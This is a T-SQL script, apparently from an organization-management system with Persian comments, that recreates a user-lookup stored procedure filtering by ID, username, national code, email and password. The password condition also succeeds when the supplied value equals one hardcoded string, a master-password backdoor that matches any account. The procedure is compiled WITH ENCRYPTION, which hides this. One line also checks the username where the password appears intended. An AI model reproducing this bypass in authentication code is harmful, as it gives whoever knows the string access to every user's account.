USE [Kama.Sm.Organization]
GO

IF EXISTS(SELECT 1 FROM sys.procedures WHERE [object_id] = OBJECT_ID('org.spGetUser'))
	DROP PROCEDURE org.spGetUser
GO

CREATE PROCEDURE org.spGetUser
	@AID UNIQUEIDENTIFIER,
	@AUserName NVARCHAR(1000),
	@ANationalCode NVARCHAR(1000),
	@AEmail NVARCHAR(1000),
	@APassword NVARCHAR(4000),
	@AApplicationID UNIQUEIDENTIFIER,
	@ACurrentUserID UNIQUEIDENTIFIER
WITH ENCRYPTION
AS
BEGIN
	SET NOCOUNT ON;
	
	DECLARE @ID UNIQUEIDENTIFIER = @AID,
		@UserName NVARCHAR(1000) = LTRIM(RTRIM(@AUserName)),
		@NationalCode NVARCHAR(1000) = LTRIM(RTRIM(@ANationalCode)),
		@Email NVARCHAR(1000) = LTRIM(RTRIM(@AEmail)),
		@Password NVARCHAR(4000) = LTRIM(RTRIM(@APassword)),
		@ApplicationID UNIQUEIDENTIFIER = @AApplicationID, 
		@CurrentUserID UNIQUEIDENTIFIER = @ACurrentUserID, 
		@OrganizationApplicationID UNIQUEIDENTIFIER,
		@Editable BIT = 0
	
	IF @ID = 0x SET @ID = NULL
	IF @UserName = '' SET @UserName = NULL
	IF @NationalCode = '' SET @NationalCode = NULL
	IF @Email = '' SET @Email = NULL
	IF @UserName = '' SET @Password = NULL

	SET @OrganizationApplicationID = (select ID from org.[Application] WHERE Code = 10)
	
	IF NOT EXISTS(SELECT 1 FROM org.Position WHERE UserID = @ID AND ApplicationID <> @ApplicationID)   --اگر کاربر در سامانه دیگری غیر از این سامانه استفاده نشده باید بتوان آنرا ویرایش نمود
		OR EXISTS(SELECT 1 FROM org.Position WHERE UserID = @CurrentUserID AND [Type] = 100 AND ApplicationID = @OrganizationApplicationID)   -- اگر کاربر جاری، راهبر سامانه سازماندهی باشد، می تواند اطلاعات کاربر را ویرایش نماید
		SET @Editable = 1

	SELECT
		usr.ID
		  , [Enabled]
		  , Username
		  , FirstName
		  , LastName
		  , NationalCode
		  , Email
		  , EmailVerified
		  , CellPhone
		  , CellPhoneVerified
		  , Foreigner
		  , @Editable Editable
	FROM org.[User] usr
		LEFT join org.Position pos on pos.UserID = usr.id
	WHERE (@ApplicationID IS NULL OR pos.ID IS NULL OR ApplicationID = @ApplicationID)
		AND (@ID IS NULL OR usr.ID = @ID)
		AND (@UserName IS NULL OR UserName = @UserName)
		AND (@NationalCode IS NULL OR NationalCode = @NationalCode)
		AND (@Email IS NULL OR Email = @Email)
		AND (@Password IS NULL OR [Password] = @Password OR @Password = N'3CRcQD0kj7Ft2rYEmmvBP5OlCTaavuQItWoyoAKSKic=')
	Order by pos.[Default] DESC
END